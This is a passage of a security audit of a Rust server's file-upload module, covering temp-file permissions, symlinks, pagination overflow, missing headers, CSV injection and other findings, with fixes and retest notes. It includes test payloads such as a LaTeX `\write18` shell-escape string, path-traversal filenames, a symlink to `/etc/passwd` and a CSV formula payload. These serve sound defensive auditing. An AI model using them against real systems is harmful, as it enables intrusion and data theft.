  1. `std::env::temp_dir()` is `/tmp` on Linux — world-readable
     by default. `fs::write` inherits the process umask (typically
     `0o022` → `0o644`), so the temp file is readable by every
     local user on the machine until cleanup runs. On a
     multi-tenant host this is a confidentiality leak. **The
     extension is also user-controlled** (joined into the filename
     with the F-03 issues — but here it's only the *file name*,
     not a directory escape; subdirectories aren't auto-created in
     `temp_dir`).
  2. UUIDv4 collision is statistically negligible, but
     `OpenOptions::new().create_new(true).open()` is the correct
     idiom; current code uses `fs::write` which truncates an
     existing file. With UUIDs the difference is moot in
     practice.
  3. **Cleanup is hand-managed** at every call site — see
     `office.rs:98, 113, 130, 142, 162, 184, 213, 229, 245, 327, 342, 350`.
     Each path has its own `cleanup_temp_file` /
     `fs::remove_dir_all` call. If a panic or early return slips
     through, the temp file leaks.
  4. The `tempfile` crate is already a dependency (`Cargo.toml:61
     tempfile = "3.15"`) but unused here. Using `tempfile::NamedTempFile`
     gives a Drop-implementing handle that always cleans up.
- **Vulnerable code:** above
- **Exploitation:**
  - Same-host read: on a shared dev box, a local non-root attacker
    runs `inotifywait /tmp` and races to read the uploaded
    document between `fs::write` and pandoc consumption.
  - Disk fill: a panic between `write_temp_file` and
    `cleanup_temp_file` leaks the file. Long-running server
    fills `/tmp`.
- **Impact:** Local same-host info disclosure; disk fill on
  unhappy paths.
- **Recommendation:**
  - Replace `write_temp_file` with `tempfile::NamedTempFile`
    (auto-cleanup, mode `0o600`, atomic create-new).
  - For the temp **directory** in
    `office_text_pdf_<uuid>` / `office_pdf_<uuid>` patterns, use
    `tempfile::TempDir`.
  - Prefer a sandboxed work-dir under `$app_data_dir/tmp/`
    (created with mode `0o700`) rather than `/tmp` so
    multi-tenant hosts can't peek.

---

### F-11 — Stored files have inherited (umask-default) permissions
- **Severity:** **Medium**
- **ASVS:** V12.4.2 (Stored uploads have restrictive permissions)
- **CWE:** CWE-732 (Incorrect Permission Assignment)
- **Location:** `src-app/server/src/modules/file/storage/filesystem.rs:53, 70, 88`
- **Description:**
  `fs::write(&path, data).await` creates files with mode
  `0o666 & !umask`, usually `0o644` (world-readable). On a
  shared host this exposes every user's uploaded files to any
  local account.

  The embedded-binary extraction code at
  `utils/embedded.rs:87, 109` explicitly sets `0o755` on Pandoc
  and libpdfium, demonstrating awareness of the issue elsewhere
  — but stored user files do not get the same treatment.
- **Vulnerable code:**
  ```rust
  // storage/filesystem.rs:53-55
  fs::write(&path, data).await
      .map_err(|e| AppError::internal_error(format!("Failed to write file: {}", e)))?;
  ```
- **Exploitation:** Same-host adversary reads
  `$XDG_DATA_HOME/ziee-chat/files/originals/<uid>/<fid>.<ext>`.
- **Impact:** Local same-host data exposure.
- **Recommendation:** After every write, set `0o600`. Better:
  use `tokio::fs::OpenOptions::new().mode(0o600).create_new(true).write(true).open()`.
  Also set `0o700` on user directories on first `ensure_dir`.

---

### F-12 — File-deletion is not transactional with storage; orphans on partial failure
- **Severity:** **Medium**
- **ASVS:** V12.4.3 (Verify file deletion is consistent across stores)
- **CWE:** CWE-459 (Incomplete Cleanup), CWE-552 (Files Accessible to External Parties)
- **Location:** `src-app/server/src/modules/file/handlers/management.rs:173-186`
- **Description:**
  ```rust
  Repos.file.delete(file_id, user_id).await?;     // 1. DB row deleted
  let storage = get_file_storage();
  storage.delete_all(user_id, file_id).await?;    // 2. Disk cleanup
  ```
  If step 2 fails (disk error, permission issue) we return
  500 — but the DB row is already gone. The on-disk file is now
  orphaned: not referenced by any DB row, not visible in
  `/api/files`, but still present on disk and addressable by
  guessing the path. This is a **dangling-reference** orphan;
  combined with F-03 (paths derived from user_id + file_id, both
  UUIDs) the probability of accidental discovery is low, but a
  **defective backup/restore** restoring the row but not the file
  (or vice versa) creates a permanent inconsistency.

  Worse direction: imagine step 1 succeeds, step 2 fails, the user
  retries the delete. Now `Repos.file.delete` returns
  `AppError::not_found("File")` because the row is gone. The user
  receives 404, but the **storage layer was never re-invoked**.
  Permanent orphan.

  Also: `delete_all` (`filesystem.rs:172-210`) silently swallows
  every `remove_file` / `remove_dir_all` error
  (`let _ = fs::remove_…(…)`). If a thumbnail file is locked
  (Windows), the function returns Ok and the file leaks.
- **Vulnerable code:** above + `filesystem.rs:172-210`.
- **Exploitation:** Not directly attacker-controlled, but the
  data quality degradation over time produces ghost files.
- **Impact:** Storage growth; possible cross-conversation file
  reuse if file_id collides across schema migrations (unlikely
  in v4 UUIDs).
- **Recommendation:**
  - Reverse the order: delete from storage first, then DB. If
    storage fails, DB row remains and the user can retry.
  - Better: idempotent deletion. Make `delete_all` succeed when
    files are already gone; make `Repos.file.delete` return Ok
    when the row is already gone. Then re-running cleanup is
    safe.
  - Best: schedule deletion as a job (mark row `pending_delete`,
    background job removes from disk and finalises). Survives
    crashes.

---

### F-13 — File-content responses missing security headers
- **Severity:** **Medium**
- **ASVS:** V14.4.5 (Verify `X-Content-Type-Options: nosniff`),
  V14.4.6 (Verify `Content-Security-Policy` on responses serving
  user content)
- **CWE:** CWE-693 (Protection Mechanism Failure)
- **Location:** every response in
  `download.rs:52-66, 158-172`, `management.rs:79-114, 164-169`
- **Description:**
  Responses serving user-uploaded bytes set only
  `Content-Type`, `Content-Disposition`, `Content-Length`. Missing:
  - `X-Content-Type-Options: nosniff` — without it, IE/older
    Chrome may MIME-sniff a file declared as `application/octet-stream`
    and execute it as HTML.
  - `Content-Security-Policy: default-src 'none'; sandbox` — when
    files are loaded into an iframe / object element (e.g., PDF
    viewer), this prevents script execution.
  - `Cross-Origin-Resource-Policy: same-origin` — prevents the
    file being cross-origin embedded for measurement/timing
    attacks.
  - `Cache-Control: private, no-store` for downloaded files —
    prevents shared caches (proxies) from storing the content.
- **Vulnerable code:** missing headers
- **Exploitation:** Less direct; aggravates F-04 and F-08.
- **Impact:** Defence-in-depth gap.
- **Recommendation:** Centralise file response building in a
  helper that always emits the four headers above. The previous
  `code_sandbox` audit recommended the same — these patterns
  should be shared.

---

### F-14 — `Repos.file.list_by_user` page/per_page parameters unvalidated
- **Severity:** **Medium**
- **ASVS:** V5.1.4 (Verify integer bounds on user-supplied indices),
  V8.1.4 (Verify pagination cannot exhaust resources)
- **CWE:** CWE-129 (Improper Validation of Array Index),
  CWE-1284 (Specified Quantity)
- **Location:** `repository.rs:107-148`, `handlers/management.rs:20-39`
- **Description:**
  `PaginationQuery { page: i32, per_page: i32 }` with defaults of
  1 and 20, but no explicit upper or lower bounds.
  `list_by_user` computes
  `let offset = ((page - 1) * per_page) as i64;` — with a
  negative `page` or negative `per_page` this is a negative
  offset, which Postgres rejects with `OFFSET must not be
  negative`, returning an error to the user (degrades to 500).
  With `per_page = i32::MAX` (2,147,483,647), the LIMIT is
  ~2 billion; Postgres tries to materialise that many rows.
- **Vulnerable code:**
  ```rust
  let offset = ((page - 1) * per_page) as i64;   // can overflow i32 → wrap → negative
  // ...
  LIMIT $2 OFFSET $3                              // unbounded
  ```
  Multiplication of two i32s in i32 space can overflow before the
  `as i64` cast: e.g., `page = 1_000_000`, `per_page =
  1_000_000` → `999_999 * 1_000_000` = overflow, wraps. In
  debug builds this panics; in release builds it wraps silently.
- **Exploitation:**
  - DoS: `?page=1&per_page=2147483647` → Postgres allocates huge
    result set, server runs out of memory composing the JSON
    response.
  - Information disclosure (minor): negative offset triggers a
    Postgres-error 500 with no additional info, but the
    error-handling path logs the SQL — currently safe in this
    codebase but worth being aware of.
- **Impact:** Server DoS via huge result set.
- **Recommendation:** Clamp `page` to `1..=10_000` and
  `per_page` to `1..=100`. Use `u32` (or `i32`-but-validated)
  for the API surface and reject invalid values with 400.

---

### F-15 — `load_*` storage methods do not resolve / verify symlinks
- **Severity:** **Medium**
- **ASVS:** V12.3.4 (Verify symlinks in upload directory cannot escape)
- **CWE:** CWE-59 (Improper Link Resolution Before File Access — Symlink Following)
- **Location:** `storage/filesystem.rs:130-170`
- **Description:**
  `load_original`, `load_text_page`, `load_preview`,
  `load_thumbnail` build a `PathBuf` and call `fs::read` /
  `fs::read_to_string`. If any component of the path is a
  symlink that points outside the storage tree, `tokio::fs::read`
  silently follows it. Combined with F-03 (which lets an attacker
  *write* to an arbitrary subdirectory of the storage tree), an
  attacker could create a symlink at
  `…/originals/AAA/uuid.pwn → /etc/passwd` and then trigger a
  read.

  More realistically: if the operator backs up the storage
  directory via rsync and rsync deferences symlinks, an attacker's
  symlink (planted via F-03) causes `/etc/passwd` to be
  exfiltrated into the backup.
- **Vulnerable code:**
  ```rust
  // filesystem.rs:130-141
  async fn load_original(...) -> StorageResult<Vec<u8>> {
      let path = self.get_original_path(user_id, file_id, extension);
      fs::read(&path).await...  // no canonicalize, no symlink check
  }
  ```
- **Exploitation:** Requires F-03 first (to plant the symlink).
- **Impact:** Server-side file read of any file readable by the
  server uid.
- **Recommendation:** Use `std::fs::canonicalize` (which resolves
  symlinks) and verify the canonical path starts with the
  canonicalised `base_path`. Reject otherwise. Do this in a
  helper that wraps every load call.
  Belt-and-braces: open the storage root with `openat2(…, RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS)`
  on Linux to push the check into the kernel.

---

### F-16 — No per-user storage quota; unlimited disk consumption
- **Severity:** **Medium**
- **ASVS:** V12.1.1 (Verify storage quota per user)
- **CWE:** CWE-770 (Allocation of Resources Without Limits)
- **Location:** `handlers/upload.rs` — no quota check
- **Description:**
  Any authenticated user with `files::upload` can upload
  unlimited 100 MB files (limit set by F-02 fix). 50 uploads ×
  100 MB = 5 GB per user. No back-pressure. The previous audit
  flagged this; current code has not addressed it.
- **Vulnerable code:** absence of code
- **Exploitation:** Single user fills disk.
- **Impact:** Disk-exhaustion DoS.
- **Recommendation:** Add `Repos.file.get_total_storage_by_user`
  query and a per-user quota check before accepting an upload.
  Configurable per role.

---

### F-17 — No rate-limiting on upload / download endpoints
- **Severity:** **Medium**
- **ASVS:** V11.1.1 (Verify rate-limiting on resource-intensive ops),
  V11.1.4
- **CWE:** CWE-770
- **Location:** route definitions in `routes.rs`
- **Description:**
  No `tower::limit::RateLimitLayer` / `tower_governor` / similar
  layer applied. A single user (or a botnet of users) can DoS the
  CPU via repeated PDF rendering / Pandoc invocations.

  Particularly bad: each PDF render runs `pdfium-render`
  synchronously inside an async function (see `pdf.rs:178-220`,
  `init_pdfium()`); `Pdfium` is not Send+Sync, so we create a new
  instance per request — every request reinitialises PDFium and
  loads the library symbol table. Costly.
- **Recommendation:** Apply `tower_governor::GovernorLayer` with
  per-user keys (key off `auth.user.id`). Separate quotas for
  upload (low, e.g. 10/min), download (higher, e.g. 100/min),
  preview/thumbnail (higher still).

---

### F-18 — `image::load_from_memory` called with unconstrained dimensions
- **Severity:** **Low**
- **ASVS:** V12.5.1 (Verify image processing limits)
- **CWE:** CWE-770
- **Location:** `processing/image.rs:63`, `text_image.rs:28`,
  `spreadsheet_image.rs:31`
- **Description:**
  `image` crate 0.25 has built-in limits (`image::io::Limits`)
  for decoded width × height × bytes-per-pixel, but the code
  uses `image::load_from_memory(data)` which uses the
  `Limits::no_limits()` default. A 64 KB PNG with declared
  dimensions of 50,000 × 50,000 pixels allocates ~10 GB on decode.

  Known as "PIL decompression bomb" / "GIMP zoom bomb".
  Mitigated upstream in 0.25.x but only when `Limits` are set.
- **Vulnerable code:**
  ```rust
  let img = image::load_from_memory(data)?;   // no .with_limits
  ```
- **Exploitation:** Upload tiny "image" with huge declared
  dimensions; server OOMs during processing.
- **Impact:** Server-wide DoS.
- **Recommendation:**
  ```rust
  use image::io::Limits;
  let mut limits = Limits::default();
  limits.max_image_width = Some(8_192);
  limits.max_image_height = Some(8_192);
  limits.max_alloc = Some(256 * 1024 * 1024);
  let img = image::ImageReader::new(Cursor::new(data))
      .with_guessed_format()?
      .limits(limits)
      .decode()?;
  ```

---

### F-19 — Filename is stored and displayed without HTML-escape consideration
- **Severity:** **Low**
- **ASVS:** V5.3.1 (Verify output encoding for HTML contexts)
- **CWE:** CWE-79 (XSS)
- **Location:** `models.rs:13` filename stored as-is; rendered
  in frontend (out of scope for this audit) but the API returns
  the raw bytes in JSON: `repository.rs:30, 87` etc.
- **Description:**
  Filename can contain `<script>`, `</textarea>`, CR/LF, NUL,
  and other interesting bytes. Multipart specs do not constrain
  filenames. The backend stores them unchanged in the DB
  `filename` column and serialises them into JSON. Whether this
  bites depends on the frontend's escape practices, which are
  out of scope here.

  Independently, **NUL bytes in filenames** terminate path
  strings prematurely in some libraries, and the filename is
  used in `Content-Disposition` header construction (F-08).
- **Recommendation:** Normalise on upload:
  - Strip control chars `0x00..=0x1F` and `0x7F`.
  - Strip path separators (`/`, `\`).
  - Length-cap at, e.g., 200 UTF-8 chars.
  - Disallow leading dot / leading dash (avoid `--option`
    confusion when filename ever reaches a CLI).
  - HTML-escape in any server-rendered context (e.g., the
    audit-log table the admin UI shows).

---

### F-20 — `Content-Type` set from MIME stored in DB; can be `text/html`
- **Severity:** **Low**
- **ASVS:** V14.4.5
- **CWE:** CWE-79 (Stored XSS)
- **Location:** `download.rs:54, 160`, `management.rs:80, 110, 165`
- **Description:**
  See F-04 — if MIME is HTML, `Content-Type: text/html` is
  served. `Content-Disposition: attachment` mitigates *if* the
  browser respects it (modern browsers do for top-level
  navigation, but `<img src>` / `<iframe src>` ignore
  `attachment` and render anyway).

  Mitigated by `X-Content-Type-Options: nosniff` (F-13) +
  blocking dangerous extensions (F-04).
- **Recommendation:** combined with F-04 + F-13.

---

### F-21 — Spreadsheet text extraction does not neutralise CSV-injection formulas
- **Severity:** **Low**
- **ASVS:** V5.3.10 (Verify CSV injection protection)
- **CWE:** CWE-1236 (Improper Neutralization of Formula Elements in CSV)
- **Location:** `utils/spreadsheet.rs:6-13, 24-39, 49-66, 71-93`
- **Description:**
  When a spreadsheet is uploaded, the per-sheet text extraction
  writes the cell values into a `text/csv`-looking format with
  only `,`/`"`/`\n` escaping. **Cells starting with `=`, `+`, `-`,
  `@`, `\t`, or `\r`** are not neutralised. If a user later
  downloads this text content and opens it in Excel, Excel
  interprets `=cmd|"…"!A1` and similar payloads as formulas →
  CSV injection.

  The extracted text is shown in the chat UI as plain text, so
  in-app the impact is low. But via `download_with_token` or
  any future export path, the cell values can flow into a
  victim's Excel.
- **Vulnerable code:**
  ```rust
  // utils/spreadsheet.rs:6-13
  fn escape_csv_cell(cell_str: &str) -> String {
      if cell_str.contains(',') || cell_str.contains('"') || cell_str.contains('\n') {
          format!("\"{}\"", cell_str.replace("\"", "\"\""))
      } else {
          cell_str.to_string()
      }
  }
  ```
  Missing: prefix dangerous cells with `'` (tab) or `\u{200B}`,
  or refuse them.
- **Recommendation:**
  ```rust
  fn escape_csv_cell(cell_str: &str) -> String {
      let needs_prefix = matches!(cell_str.chars().next(), Some('=' | '+' | '-' | '@' | '\t' | '\r'));
      let safe = if needs_prefix { format!("'{}", cell_str) } else { cell_str.to_string() };
      if safe.contains(',') || safe.contains('"') || safe.contains('\n') {
          format!("\"{}\"", safe.replace("\"", "\"\""))
      } else {
          safe
      }
  }
  ```

---

### F-22 — `processing_metadata` JSON stored unbounded
- **Severity:** **Low**
- **ASVS:** V13.2.4 (Verify JSON validation), V12.1.3
- **CWE:** CWE-1284
- **Location:** `handlers/upload.rs:139-140`,
  `repository.rs:31, 62, 89, 130`
- **Description:**
  ```rust
  processing_metadata: serde_json::to_value(&processing_result.metadata)
      .unwrap_or(serde_json::json!({})),
  ```
  Today the `ProcessingMetadata` struct is small and bounded by
  the processors, so the JSONB column is small. If a future
  processor adds an attacker-influenceable field (e.g.,
  `extracted_keywords` from a doc), it could be unbounded. Add
  size/depth guards as suggested in the 2025-11 audit. Low
  priority; not currently exploitable.

---

### F-23 — Error messages reveal path information
- **Severity:** **Low**
- **ASVS:** V7.4.1 (Verify error responses do not reveal stack traces
  or internal paths)
- **CWE:** CWE-209 (Generation of Error Message Containing Sensitive
  Information)
- **Location:** `storage/filesystem.rs:30, 55, 72, 90, 140, 148, 161, 169`
- **Description:**
  ```rust
  AppError::internal_error(format!("Failed to write file: {}", e))
  AppError::not_found(&format!("File not found: {}", e))
  ```
  The `e` from `tokio::fs` errors typically includes the OS error
  string and sometimes the path. These propagate to the client in
  the `AppError` JSON `message` field. Disclosing the storage root
  path to clients lets them probe for related files via path
  traversal.

  Compare with the auth module which generally returns
  `AppError::not_found("File")` with a static string. The file
  module's load helpers return paths.
- **Recommendation:** Log full error with `tracing::error!`, return
  static client message:
  ```rust
  .map_err(|e| {
      tracing::error!(?path, error = ?e, "load_original failed");
      AppError::not_found("File")
  })
  ```

---

### F-24 — `find_pandoc` falls back to system `pandoc` via `which::which("pandoc")`
- **Severity:** **Info**
- **ASVS:** V10.3.1 (Verify trusted execution path)
- **CWE:** CWE-426 (Untrusted Search Path)
- **Location:** `utils/pandoc.rs:8-30`
- **Description:**
  If embedded Pandoc fails to extract, the server falls back to
  `which::which("pandoc")` which honours `PATH`. If the server uid's
  `PATH` includes a writable directory (e.g.,
  `/home/serveruser/.local/bin`), a local-attacker scenario allows
  Pandoc replacement. Likely benign on a controlled deployment but
  worth pinning to a known absolute path.
- **Recommendation:** Refuse to start if embedded Pandoc extraction
  fails. No fallback. Or restrict the fallback to `/usr/bin/pandoc`
  / `/usr/local/bin/pandoc` only.

---

### F-25 — Embedded binaries (Pandoc + libpdfium) extracted with `0o755`, no integrity check
- **Severity:** **Info**
- **ASVS:** V10.3.3 (Verify embedded binaries integrity)
- **CWE:** CWE-494 (Download of Code Without Integrity Check)
- **Location:** `utils/embedded.rs:65-125`
- **Description:**
  Pandoc and libpdfium are `include_bytes!`'d into the server at
  build time and extracted to
  `$app_data_dir/bin/` on first start. Once extracted, the same
  files are reused indefinitely — the code at line 76 / 98
  checks only `path.exists()`. If the extracted binary is
  tampered with after first extraction (e.g., a privileged user
  replaces it), subsequent server starts use the tampered
  binary.

  Mitigation: check a sha256 of the extracted file against the
  embedded constant on every start. Or: extract every time
  (a few-MB write is cheap relative to startup).

  Lower severity because the build-time `include_bytes!` is the
  trust root — if you trust the build, the bytes are signed by
  Cargo/sigstore (when present). Post-extraction tampering
  requires file-system access, at which point most things are
  game.

---

### F-26 — `is_code_file` content heuristic is trivially gameable but doesn't change security state
- **Severity:** **Info**
- **Location:** `processing/text_image.rs:84-104`
- **Description:** Heuristic for selecting code-vs-text rendering
  colour scheme. No security impact; noted for completeness.

---

### F-27 — `PaginationQuery::per_page` default 20, no upper bound
- **Severity:** **Info**
- **Location:** `types.rs:36-38`
- **Description:** See F-14. Default is fine; the missing cap is
  the actual issue.

---

## ASVS Coverage Matrix

| ASVS § | Control | Finding(s) | Status |
|---|---|---|---|
| V3.5.2 | JWT `iss` validated | F-07 | Fail |
| V3.5.3 | JWT `aud` validated | F-07 | Fail |
| V4.1.1 | Authorization enforced on every request | F-06 | Fail |
| V4.1.3 | Least-privilege | F-06 | Fail |
| V5.1.4 | Integer bounds on indices | F-14 | Fail |
| V5.2.3 | Sanitize input to interpreters | F-01 | **Critical fail** |
| V5.3.1 | Output encoding (HTML) | F-19, F-20 | Partial fail |
| V5.3.4 | HTTP header response splitting | F-08 | Partial fail (Axum lower-layer rejects CRLF) |
| V5.3.10 | CSV injection neutralisation | F-21 | Fail |
| V7.4.1 | Error msg path disclosure | F-23 | Fail |
| V8.1.4 | Pagination resource exhaustion | F-14 | Fail |
| V10.3.1 | Trusted subprocess path | F-24 | Partial fail |
| V10.3.2 | Argv hygiene / bounded execution | F-01, F-09 | Fail |
| V10.3.3 | Embedded binary integrity | F-25 | Partial fail |
| V11.1.1 | Rate-limit resource-intensive ops | F-17 | Fail |
| V12.1.1 | Upload size cap | F-02, F-16 | Fail |
| V12.1.2 | Bounded decompression | F-05 | Fail |
| V12.1.3 | Bounded JSON parsing | F-22 | Partial fail |
| V12.3.1 | Filename sanitisation | F-03, F-19 | Fail |
| V12.3.4 | Symlinks contained | F-15 | Fail |
| V12.4.1 | Magic-byte verification | F-04 | Fail |
| V12.4.2 | Temp file / stored file permissions | F-10, F-11 | Fail |
| V12.4.3 | Cleanup / deletion consistency | F-10, F-12 | Fail |
| V12.5.1 | Image processing limits | F-18 | Fail |
| V12.5.2 | Server-side processing isolation | F-01 | **Critical fail** |
| V12.5.3 | Subprocess timeout | F-09 | Fail |
| V13.2.4 | JSON validation | F-22 | Partial fail |
| V14.4.5 | `X-Content-Type-Options: nosniff` | F-13, F-20 | Fail |
| V14.4.6 | CSP on user-content responses | F-13 | Fail |

Net: roughly **8 PASS / 20+ FAIL** against the Level-2 controls we exercised.

---

## Positive Findings

1. **Per-user ACL on every read path.** All retrieval handlers
   (`download_file`, `get_file`, `get_preview`, `get_thumbnail`,
   `get_text_content`, `delete_file`) call
   `Repos.file.get_by_id_and_user(file_id, user_id)` before
   serving. Cross-user access is enforced at the DB query layer,
   not just at a service-layer check that could be skipped.
   `download_with_token` does call the same check (line 137) —
   the issue with that endpoint is the absence of a *current*
   permission check, not a missing ownership check.
2. **All SQL is parameterised** via `sqlx::query_as!` /
   `sqlx::query_scalar!` macros. No string concatenation. The
   compile-time validation also means a future column-name
   confusion can't accidentally widen a query.
3. **Per-permission gating** via the `RequirePermissions`
   extractor distinguishes upload / download / read / preview /
   delete / generate-token. Allows fine-grained roles.
4. **UUIDv4 for both `user_id` (from JWT) and `file_id` (server-
   generated)** — neither is enumerable.
5. **Original file, derived thumbnails, derived preview pages,
   and extracted text are stored in separate per-user
   sub-directories** (`originals/`, `thumbnails/`, `images/`,
   `text/`). Aids forensics and per-feature retention.
6. **Pandoc and libpdfium are embedded** in the server binary at
   compile time (`include_bytes!`), eliminating PATH-resolution
   ambiguity for the *primary* lookup path (see F-24 for the
   fallback path concern).
7. **SHA-256 checksums** are computed on every upload and
   persisted to the `checksum` column — useful for de-dup and
   change-detection.
8. **CASCADE delete on `user_id`** in
   `migrations/00000000000014_create_files_table.sql` ensures
   DB rows for deleted users are removed; on-disk cleanup is
   not similarly cascaded (see F-12).
9. **`created_by` column** (added in migration 34) lets the
   server distinguish `'user'`, `'llm'`, and (future) `'mcp'`
   sources, supporting differential policy.
10. **No use of `std::process::Command::new("sh").arg("-c")`**
    anywhere in the module — Pandoc is invoked with proper argv
    splits. (The Pandoc-itself-runs-pdflatex chain is what F-01
    is about; that's a tool-design issue, not a Rust-side
    command-injection.)

---

## Out of Scope / Deferred

- **`modules/llm_provider_files/`**: separate audit (handles
  uploading files into provider-side storage for Anthropic /
  OpenAI Vision etc.). Not reviewed here.
- **Frontend rendering of filenames / extracted text**: F-19 /
  F-20 note where the backend leaves user-content unescaped;
  whether the UI then escapes is in the frontend's audit.
- **`code_sandbox` artifact-save path** (writes files with
  `created_by='llm'`): out of scope here. The code_sandbox
  module's own audit (`07-core-infrastructure-audit.md` or
  `02-chat-module-audit.md`) covers it.
- **Database backup encryption / file storage-at-rest
  encryption**: infrastructure concern, out of scope of
  module-level audit.
- **Antivirus / clamd integration**: not present; not
  flagged as a finding because the threat model didn't
  declare it required. Worth considering for production.

---

## Notes for next pass

- Re-verify F-01 after fix: walk through the full pdflatex
  argv to confirm `-no-shell-escape` arrived. The Pandoc CLI
  `--pdf-engine-opt=-no-shell-escape` should produce a
  pdflatex invocation that ignores `\write18`. Test with the
  public PoC `\immediate\write18{touch /tmp/pwn}` in a
  small DOCX.
- After F-02 + F-16 fix, write integration tests that
  upload `dd if=/dev/zero bs=1M count=200` and confirm a
  413 response, AND that server RSS stays bounded (check
  via `/proc/self/status` in a follow-up call).
- After F-03 fix, integration test: upload with filenames
  `"../etc/passwd"`, `"x.\u{0000}.txt"`, `"x.x/../../y"`,
  `"x.x/../../<other_user>/file.bin"` — all must 400 or be
  stored under the user's own UUID directory only.
- After F-13 fix, run `curl -I /api/files/<id>/download` and
  confirm `x-content-type-options: nosniff`,
  `content-security-policy: default-src 'none'; sandbox`,
  `cross-origin-resource-policy: same-origin`,
  `cache-control: private, no-store`.

---

**End of audit.**
